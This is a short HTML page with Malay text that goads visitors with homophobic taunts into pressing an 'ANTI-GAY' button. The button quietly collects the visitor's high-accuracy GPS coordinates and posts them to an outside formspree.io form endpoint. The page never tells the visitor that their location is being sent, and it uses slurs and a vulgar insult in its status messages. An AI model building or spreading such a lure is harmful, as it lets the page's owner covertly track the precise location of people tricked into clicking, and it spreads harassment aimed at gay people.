<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Share Location</title>
  <style>
    body { 
      font-family: Arial, sans-serif; 
      padding: 20px; 
      text-align: center; 
    }
    button { 
      padding: 10px 20px; 
      font-size: 16px; 
      cursor: pointer; 
    }
    #status { 
      margin-top: 15px; 
      font-weight: bold; 
    }
  </style>
</head>
<body>
  <h2>Kalau tidak tekan butang dibawah,GAY</h2>
  <button onclick="getLocation()">Butang ANTI-GAY</button>
  <p id="status"></p>

  <script>
    async function getLocation() {
      const status = document.getElementById("status");

      if (!navigator.geolocation) {
        status.innerText = "skill issue browser mu.";
        return;
      }

      status.innerText = "Kalau tidak tekan, GAY";

      navigator.geolocation.getCurrentPosition(
        async function(position) {
          const data = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          };

          try {
            const response = await fetch("https://formspree.io/f/xlgwbqka", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(data)
            });

            if (response.ok) {
              status.innerText = "Tahniah Anda Tidak Gay!";
            } else {
              status.innerText = "Kontol";
            }
          } catch (error) {
            status.innerText = "Kontol";
          }
        },
        function(error) {
          if (error.code === error.PERMISSION_DENIED) {
            status.innerText = "Permission denied.";
          } else {
            status.innerText = "Kontol";
          }
        },
        { enableHighAccuracy: true }
      );
    }
  </script>
</body>
</html>
